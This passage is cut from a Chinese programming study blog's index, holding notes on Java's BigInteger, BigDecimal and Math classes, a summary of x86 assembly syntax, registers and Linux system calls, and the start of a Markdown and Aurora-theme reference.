class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;12345678901234567890&quot;</span>);</span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;98765432109876543210&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">sum</span> <span class="operator">=</span> a.add(b);</span><br><span class="line">System.out.println(<span class="string">&quot;加法结果: &quot;</span> + sum);</span><br><span class="line"></span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">product</span> <span class="operator">=</span> a.multiply(b);</span><br><span class="line">System.out.println(<span class="string">&quot;乘法结果: &quot;</span> + product);</span><br><span class="line"></span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">quotient</span> <span class="operator">=</span> a.divide(b);</span><br><span class="line">System.out.println(<span class="string">&quot;除法结果: &quot;</span> + quotient);</span><br><span class="line"></span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">remainder</span> <span class="operator">=</span> a.mod(b);</span><br><span class="line">System.out.println(<span class="string">&quot;取模结果: &quot;</span> + remainder);</span><br></pre></td></tr></table></figure><h2 id="29-BigDecimal-类"><a href="#29-BigDecimal-类" class="headerlink" title="29. BigDecimal 类"></a>29. <code>BigDecimal</code> 类</h2><p>用于表示任意精度的浮点数。</p><h3 id="常用方法-23"><a href="#常用方法-23" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>add(BigDecimal augend)</code></td><td>加法运算</td><td>另一个<code>BigDecimal</code></td><td><code>BigDecimal</code></td></tr><tr><td><code>subtract(BigDecimal subtrahend)</code></td><td>减法运算</td><td>另一个<code>BigDecimal</code></td><td><code>BigDecimal</code></td></tr><tr><td><code>multiply(BigDecimal multiplicand)</code></td><td>乘法运算</td><td>另一个<code>BigDecimal</code></td><td><code>BigDecimal</code></td></tr><tr><td><code>divide(BigDecimal divisor)</code></td><td>除法运算</td><td>另一个<code>BigDecimal</code></td><td><code>BigDecimal</code></td></tr><tr><td><code>divide(BigDecimal divisor, int scale, RoundingMode roundingMode)</code></td><td>除法运算，指定精度和舍入模式</td><td>另一个<code>BigDecimal</code>、精度、舍入模式</td><td><code>BigDecimal</code></td></tr><tr><td><code>setScale(int newScale, RoundingMode roundingMode)</code></td><td>设置小数位数并舍入</td><td>小数位数、舍入模式</td><td><code>BigDecimal</code></td></tr><tr><td><code>compareTo(BigDecimal val)</code></td><td>比较两个<code>BigDecimal</code>的大小</td><td>另一个<code>BigDecimal</code></td><td><code>int</code></td></tr><tr><td><code>toString()</code></td><td>返回<code>BigDecimal</code>的字符串表示</td><td>无</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-28"><a href="#示例代码-28" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1234567890.1234567890&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;9876543210.9876543210&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">sum</span> <span class="operator">=</span> a.add(b);</span><br><span class="line">System.out.println(<span class="string">&quot;加法结果: &quot;</span> + sum);</span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">product</span> <span class="operator">=</span> a.multiply(b);</span><br><span class="line">System.out.println(<span class="string">&quot;乘法结果: &quot;</span> + product);</span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">quotient</span> <span class="operator">=</span> a.divide(b, <span class="number">2</span>, RoundingMode.HALF_UP);</span><br><span class="line">System.out.println(<span class="string">&quot;除法结果（保留两位小数）: &quot;</span> + quotient);</span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">scaled</span> <span class="operator">=</span> a.setScale(<span class="number">4</span>, RoundingMode.HALF_UP);</span><br><span class="line">System.out.println(<span class="string">&quot;设置小数位数为4: &quot;</span> + scaled);</span><br></pre></td></tr></table></figure><h2 id="30-Math-类"><a href="#30-Math-类" class="headerlink" title="30. Math 类"></a>30. <code>Math</code> 类</h2><p>提供基本的数学函数。</p><h3 id="常用方法-24"><a href="#常用方法-24" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>abs(double a)</code></td><td>返回参数的绝对值</td><td>要计算绝对值的数</td><td><code>double</code></td></tr><tr><td><code>sqrt(double a)</code></td><td>返回参数的平方根</td><td>要计算平方根的数</td><td><code>double</code></td></tr><tr><td><code>pow(double a, double b)</code></td><td>返回a的b次幂</td><td>底数、指数</td><td><code>double</code></td></tr><tr><td><code>max(double a, double b)</code></td><td>返回两个数中的较大值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>min(double a, double b)</code></td><td>返回两个数中的较小值</td><td>两个数</td><td><code>double</code></td></tr><tr><td><code>round(double a)</code></td><td>返回最接近参数的整数</td><td>要四舍五入的数</td><td><code>long</code></td></tr><tr><td><code>random()</code></td><td>返回一个介于0.0（包括）和1.0（不包括）之间的随机数</td><td>无</td><td><code>double</code></td></tr><tr><td><code>sin(double a)</code></td><td>返回参数的正弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>cos(double a)</code></td><td>返回参数的余弦值</td><td>角度（弧度）</td><td><code>double</code></td></tr><tr><td><code>tan(double a)</code></td><td>返回参数的正切值</td><td>角度（弧度）</td><td><code>double</code></td></tr></tbody></table></div><h3 id="示例代码-29"><a href="#示例代码-29" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;绝对值: &quot;</span> + Math.abs(-<span class="number">5.5</span>)); <span class="comment">// 5.5</span></span><br><span class="line">System.out.println(<span class="string">&quot;平方根: &quot;</span> + Math.sqrt(<span class="number">25</span>)); <span class="comment">// 5.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;3的4次幂: &quot;</span> + Math.pow(<span class="number">3</span>, <span class="number">4</span>)); <span class="comment">// 81.0</span></span><br><span class="line">System.out.println(<span class="string">&quot;最大值: &quot;</span> + Math.max(<span class="number">10</span>, <span class="number">20</span>)); <span class="comment">// 20</span></span><br><span class="line">System.out.println(<span class="string">&quot;随机数: &quot;</span> + Math.random()); <span class="comment">// 例如: 0.64523</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言笔记</title>
      <link href="/posts/74313cf1.html"/>
      <url>/posts/74313cf1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单总结一下汇编语言的语法和知识点，详情参考<a href="https://www.w3ccoo.com/assembly/index.html">汇编语言教程</a></p></blockquote><h1 id="汇编语言语法与知识点总结"><a href="#汇编语言语法与知识点总结" class="headerlink" title="汇编语言语法与知识点总结"></a>汇编语言语法与知识点总结</h1><h2 id="一、汇编语言概述"><a href="#一、汇编语言概述" class="headerlink" title="一、汇编语言概述"></a>一、汇编语言概述</h2><ul><li><strong>定义</strong>：汇编语言是一种低级编程语言，介于机器语言和高级语言之间，使用助记符表示机器指令。</li><li><strong>特点</strong>：<ul><li>与硬件紧密结合，执行效率高。</li><li>针对特定的处理器架构，可移植性差。</li><li>编写和调试难度较大，但运行效率高。</li></ul></li></ul><h2 id="二、基本语法结构"><a href="#二、基本语法结构" class="headerlink" title="二、基本语法结构"></a>二、基本语法结构</h2><h3 id="（一）指令格式"><a href="#（一）指令格式" class="headerlink" title="（一）指令格式"></a>（一）指令格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[label:] 指令助记符 操作数1, 操作数2</span><br></pre></td></tr></table></figure><ul><li><strong>标签（Label）</strong>：可选，用于标记代码位置，便于跳转。</li><li><strong>指令助记符（Mnemonic）</strong>：表示操作类型，如 <code>MOV</code>、<code>ADD</code> 等。</li><li><strong>操作数（Operand）</strong>：指令的操作对象，可以是寄存器、内存地址或立即数。</li></ul><h3 id="（二）注释"><a href="#（二）注释" class="headerlink" title="（二）注释"></a>（二）注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; 这是注释内容</span><br></pre></td></tr></table></figure><ul><li>注释从分号 <code>;</code> 开始，到行尾结束，用于说明代码功能。</li></ul><h2 id="三、指令分类"><a href="#三、指令分类" class="headerlink" title="三、指令分类"></a>三、指令分类</h2><h3 id="（一）数据传送指令"><a href="#（一）数据传送指令" class="headerlink" title="（一）数据传送指令"></a>（一）数据传送指令</h3><ul><li><strong>MOV</strong>：数据传送指令，用于寄存器和内存之间的数据移动。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, BX       ; 将 BX 寄存器的内容传送到 AX 寄存器</span><br><span class="line">MOV CX, [SI]     ; 将内存地址 [SI] 中的内容传送到 CX 寄存器</span><br></pre></td></tr></table></figure></li></ul><h3 id="（二）算术运算指令"><a href="#（二）算术运算指令" class="headerlink" title="（二）算术运算指令"></a>（二）算术运算指令</h3><ul><li><strong>ADD</strong>：加法指令。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD AX, BX       ; AX = AX + BX</span><br></pre></td></tr></table></figure></li><li><strong>SUB</strong>：减法指令。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB AX, BX       ; AX = AX - BX</span><br></pre></td></tr></table></figure></li><li><strong>MUL</strong>：乘法指令。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MUL BX           ; AX = AX * BX（结果存于 DX:AX 中）</span><br></pre></td></tr></table></figure></li><li><strong>DIV</strong>：除法指令。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIV BX           ; AX / BX，商存于 AX，余数存于 DX</span><br></pre></td></tr></table></figure></li></ul><h3 id="（三）逻辑运算指令"><a href="#（三）逻辑运算指令" class="headerlink" title="（三）逻辑运算指令"></a>（三）逻辑运算指令</h3><ul><li><strong>AND</strong>：按位与。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND AX, 0FFh     ; AX = AX &amp; 0FFh</span><br></pre></td></tr></table></figure></li><li><strong>OR</strong>：按位或。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OR AX, 0FFh      ; AX = AX | 0FFh</span><br></pre></td></tr></table></figure></li><li><strong>XOR</strong>：按位异或。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XOR AX, AX       ; AX = AX ^ AX（清零 AX）</span><br></pre></td></tr></table></figure></li><li><strong>NOT</strong>：按位取反。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOT AX           ; AX = ~AX</span><br></pre></td></tr></table></figure></li></ul><h3 id="（四）控制转移指令"><a href="#（四）控制转移指令" class="headerlink" title="（四）控制转移指令"></a>（四）控制转移指令</h3><ul><li><strong>JMP</strong>：无条件跳转。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP label        ; 跳转到标签 label</span><br></pre></td></tr></table></figure></li><li><strong>条件跳转指令</strong>：根据标志寄存器的状态进行跳转。<ul><li><strong>JZ/JE</strong>：零标志（ZF）为 1 时跳转。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JZ label       ; 如果 ZF=1，跳转到 label</span><br></pre></td></tr></table></figure></li><li><strong>JNZ/JNE</strong>：零标志（ZF）为 0 时跳转。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNZ label      ; 如果 ZF=0，跳转到 label</span><br></pre></td></tr></table></figure></li><li><strong>JG/JNLE</strong>：大于（SF=0 且 ZF=0）时跳转。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JG label       ; 如果 SF=0 且 ZF=0，跳转到 label</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="（五）程序调用与返回"><a href="#（五）程序调用与返回" class="headerlink" title="（五）程序调用与返回"></a>（五）程序调用与返回</h3><ul><li><strong>CALL</strong>：调用子程序。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL subroutine  ; 调用子程序 subroutine</span><br></pre></td></tr></table></figure></li><li><strong>RET</strong>：从子程序返回。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RET              ; 返回到调用点</span><br></pre></td></tr></table></figure></li></ul><h2 id="四、寄存器"><a href="#四、寄存器" class="headerlink" title="四、寄存器"></a>四、寄存器</h2><h3 id="（一）通用寄存器"><a href="#（一）通用寄存器" class="headerlink" title="（一）通用寄存器"></a>（一）通用寄存器</h3><ul><li><strong>AX</strong>：累加器，用于算术运算和数据传送。</li><li><strong>BX</strong>：基址寄存器，用于存储内存地址。</li><li><strong>CX</strong>：计数寄存器，用于循环计数。</li><li><strong>DX</strong>：数据寄存器，用于存储 I/O 操作的数据。</li></ul><h3 id="（二）段寄存器"><a href="#（二）段寄存器" class="headerlink" title="（二）段寄存器"></a>（二）段寄存器</h3><ul><li><strong>CS</strong>：代码段寄存器。</li><li><strong>DS</strong>：数据段寄存器。</li><li><strong>SS</strong>：堆栈段寄存器。</li><li><strong>ES</strong>：附加段寄存器。</li></ul><h3 id="（三）其他寄存器"><a href="#（三）其他寄存器" class="headerlink" title="（三）其他寄存器"></a>（三）其他寄存器</h3><ul><li><strong>IP</strong>：指令指针，指向当前指令的地址。</li><li><strong>FLAGS</strong>：状态标志寄存器，存储程序运行状态（如 ZF、CF、SF 等）。</li></ul><h2 id="五、伪指令"><a href="#五、伪指令" class="headerlink" title="五、伪指令"></a>五、伪指令</h2><h3 id="（一）数据定义伪指令"><a href="#（一）数据定义伪指令" class="headerlink" title="（一）数据定义伪指令"></a>（一）数据定义伪指令</h3><ul><li><strong>DB</strong>：定义字节。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data1 DB 0x12    ; 定义一个字节数据 0x12</span><br></pre></td></tr></table></figure></li><li><strong>DW</strong>：定义字。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data2 DW 0x1234  ; 定义一个字数据 0x1234</span><br></pre></td></tr></table></figure></li><li><strong>DD</strong>：定义双字。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data3 DD 0x12345678 ; 定义一个双字数据 0x12345678</span><br></pre></td></tr></table></figure></li></ul><h3 id="（二）段定义伪指令"><a href="#（二）段定义伪指令" class="headerlink" title="（二）段定义伪指令"></a>（二）段定义伪指令</h3><ul><li><strong>SEGMENT</strong>：定义段。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DATA SEGMENT</span><br><span class="line">data1 DB 0x12</span><br><span class="line">DATA ENDS</span><br></pre></td></tr></table></figure></li></ul><h3 id="（三）程序控制伪指令"><a href="#（三）程序控制伪指令" class="headerlink" title="（三）程序控制伪指令"></a>（三）程序控制伪指令</h3><ul><li><strong>START</strong>：程序入口点。</li><li><strong>END</strong>：程序结束。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">END             ; 程序结束</span><br></pre></td></tr></table></figure></li></ul><h2 id="六、汇编程序的基本结构"><a href="#六、汇编程序的基本结构" class="headerlink" title="六、汇编程序的基本结构"></a>六、汇编程序的基本结构</h2><h3 id="（一）代码段"><a href="#（一）代码段" class="headerlink" title="（一）代码段"></a>（一）代码段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CODE SEGMENT</span><br><span class="line">START:</span><br><span class="line">    MOV AX, 0x1234</span><br><span class="line">    MOV BX, AX</span><br><span class="line">    ...</span><br><span class="line">CODE ENDS</span><br></pre></td></tr></table></figure><h3 id="（二）数据段"><a href="#（二）数据段" class="headerlink" title="（二）数据段"></a>（二）数据段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DATA SEGMENT</span><br><span class="line">data1 DB 0x12</span><br><span class="line">data2 DW 0x3456</span><br><span class="line">DATA ENDS</span><br></pre></td></tr></table></figure><h3 id="（三）堆栈段"><a href="#（三）堆栈段" class="headerlink" title="（三）堆栈段"></a>（三）堆栈段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STACK SEGMENT</span><br><span class="line">    DW 256 DUP(?)  ; 分配 256 字的堆栈空间</span><br><span class="line">STACK ENDS</span><br></pre></td></tr></table></figure><h2 id="七、示例程序"><a href="#七、示例程序" class="headerlink" title="七、示例程序"></a>七、示例程序</h2><h3 id="（一）简单加法程序"><a href="#（一）简单加法程序" class="headerlink" title="（一）简单加法程序"></a>（一）简单加法程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DATA SEGMENT</span><br><span class="line">    num1 DB 0x12</span><br><span class="line">    num2 DB 0x34</span><br><span class="line">    result DB ?</span><br><span class="line">DATA ENDS</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">START:</span><br><span class="line">    MOV AL, num1</span><br><span class="line">    ADD AL, num2</span><br><span class="line">    MOV result, AL</span><br><span class="line">    ...</span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><h3 id="（二）循环程序"><a href="#（二）循环程序" class="headerlink" title="（二）循环程序"></a>（二）循环程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DATA SEGMENT</span><br><span class="line">    count DB 10</span><br><span class="line">DATA ENDS</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">START:</span><br><span class="line">    MOV CX, count</span><br><span class="line">loop_start:</span><br><span class="line">    ; 循环体</span><br><span class="line">    LOOP loop_start</span><br><span class="line">    ...</span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><h2 id="八、常用函数与系统调用"><a href="#八、常用函数与系统调用" class="headerlink" title="八、常用函数与系统调用"></a>八、常用函数与系统调用</h2><h3 id="（一）Linux-系统调用"><a href="#（一）Linux-系统调用" class="headerlink" title="（一）Linux 系统调用"></a>（一）Linux 系统调用</h3><p>在 Linux 中，系统调用通过中断 <code>0x80</code> 或 <code>syscall</code> 指令实现。常见的系统调用包括：</p><ul><li><p><strong>write</strong>：写入数据到文件描述符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 4      ; 系统调用号 4 表示 write</span><br><span class="line">MOV EBX, 1      ; 文件描述符 1 表示标准输出</span><br><span class="line">MOV ECX, message ; 数据地址</span><br><span class="line">MOV EDX, length ; 数据长度</span><br><span class="line">INT 0x80        ; 触发中断</span><br></pre></td></tr></table></figure></li><li><p><strong>read</strong>：从文件描述符读取数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 3      ; 系统调用号 3 表示 read</span><br><span class="line">MOV EBX, 0      ; 文件描述符 0 表示标准输入</span><br><span class="line">MOV ECX, buffer ; 缓冲区地址</span><br><span class="line">MOV EDX, 256    ; 缓冲区大小</span><br><span class="line">INT 0x80        ; 触发中断</span><br></pre></td></tr></table></figure></li><li><p><strong>exit</strong>：退出程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 1      ; 系统调用号 1 表示 exit</span><br><span class="line">MOV EBX, 0      ; 返回值</span><br><span class="line">INT 0x80        ; 触发中断</span><br></pre></td></tr></table></figure></li></ul><h3 id="（二）函数调用约定"><a href="#（二）函数调用约定" class="headerlink" title="（二）函数调用约定"></a>（二）函数调用约定</h3><p>在函数调用中，参数传递和返回值的处理遵循一定的规则：</p><ul><li><p><strong>参数传递</strong>：在 x86 架构中，参数通常通过栈传递。调用函数前，将参数依次压入栈中（从右到左），然后调用函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH param2</span><br><span class="line">PUSH param1</span><br><span class="line">CALL function</span><br></pre></td></tr></table></figure></li><li><p><strong>返回值</strong>：函数的返回值通常存储在寄存器中。在 x86 中，整数返回值存储在 <code>EAX</code> 寄存器。</p></li></ul><h3 id="（三）常见库函数"><a href="#（三）常见库函数" class="headerlink" title="（三）常见库函数"></a>（三）常见库函数</h3><ul><li><p><strong>printf</strong>：格式化输出函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PUSH param2</span><br><span class="line">PUSH param1</span><br><span class="line">CALL printf</span><br><span class="line">ADD ESP, 8      ; 清理栈空间</span><br></pre></td></tr></table></figure></li><li><p><strong>scanf</strong>：格式化输入函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH format</span><br><span class="line">CALL scanf</span><br><span class="line">ADD ESP, 4      ; 清理栈空间</span><br></pre></td></tr></table></figure></li></ul><h2 id="九、汇编语言在-Pwn-中的应用"><a href="#九、汇编语言在-Pwn-中的应用" class="headerlink" title="九、汇编语言在 Pwn 中的应用"></a>九、汇编语言在 Pwn 中的应用</h2><h3 id="（一）漏洞分析"><a href="#（一）漏洞分析" class="headerlink" title="（一）漏洞分析"></a>（一）漏洞分析</h3><p>汇编语言在分析二进制程序漏洞时至关重要。通过反汇编程序，可以查看函数实现、数据结构和控制流，发现潜在的漏洞点，如缓冲区溢出、格式化字符串漏洞等。</p><h3 id="（二）构造-Payload"><a href="#（二）构造-Payload" class="headerlink" title="（二）构造 Payload"></a>（二）构造 Payload</h3><p>在利用漏洞时，常常需要构造特定的 payload。汇编语言可以帮助理解如何构建恶意输入，例如覆盖返回地址、注入 shellcode 等。</p><h3 id="（三）调试与测试"><a href="#（三）调试与测试" class="headerlink" title="（三）调试与测试"></a>（三）调试与测试</h3><p>使用调试工具（如 gdb）结合汇编知识，可以单步跟踪程序执行，查看寄存器和内存状态，验证漏洞利用的有效性。</p>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown基本操作</title>
      <link href="/posts/5df87593.html"/>
      <url>/posts/5df87593.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>简单做个markdown的笔记，详细内容参考<a href="https://www.runoob.com/markdown/md-tutorial.html">Markdown 教程</a></p></blockquote><h1 id="Aurora中文章的Front-Meta属性"><a href="#Aurora中文章的Front-Meta属性" class="headerlink" title="Aurora中文章的Front-Meta属性"></a>Aurora中文章的Front-Meta属性</h1><h2 id="新建文章配置"><a href="#新建文章配置" class="headerlink" title="新建文章配置"></a>新建文章配置</h2><div class="table-container"><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td>img</td><td>featureImages 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.</td></tr><tr><td>top</td><td>true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td>cover</td><td>false</td><td>v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td>v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td>toc</td><td>true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td>mathjax</td><td>false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr></tbody></table></div><p>更多markdown语法参考: </p><p><a href="https://github.com/Sakiyary/Markdown-Typora-VSCode-Doc">https://github.com/Sakiyary/Markdown-Typora-VSCode-Doc</a></p><h1 id="基本功能快捷键"><a href="#基本功能快捷键" class="headerlink" title="基本功能快捷键"></a>基本功能快捷键</h1><h2 id="字体操作快捷键"><a href="#字体操作快捷键" class="headerlink" title="字体操作快捷键"></a>字体操作快捷键</h2><div class="table-container"><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">快捷键</th></tr></thead><tbody><tr><td style="text-align:center">字体加粗</td><td style="text-align:center">Ctrl+B</td></tr><tr><td style="text-align:center">下划线</td><td style="text-align:center">Ctrl+U</td></tr><tr><td style="text-align:center">倾斜</td><td style="text-align:center">Ctrl+I</td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center">Alt+Shift+5</td></tr></tbody></table></div><h2 id="入功能快键键"><a href="#入功能快键键" class="headerlink" title="入功能快键键"></a>入功能快键键</h2><div class="table-container"><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">快捷键</th></tr></thead><tbody><tr><td style="text-align:center">插入图片(本地图片可直接拖入)</td><td style="text-align:center">Ctrl+Shift+I</td></tr><tr><td style="text-align:center">插入表格</td><td style="text-align:center">Ctrl+T</td></tr><tr><td style="text-align:center">插入有序列表</td><td style="text-align:center">Ctrl+Shift+[</td></tr><tr><td style="text-align:center">插入无序列表</td><td 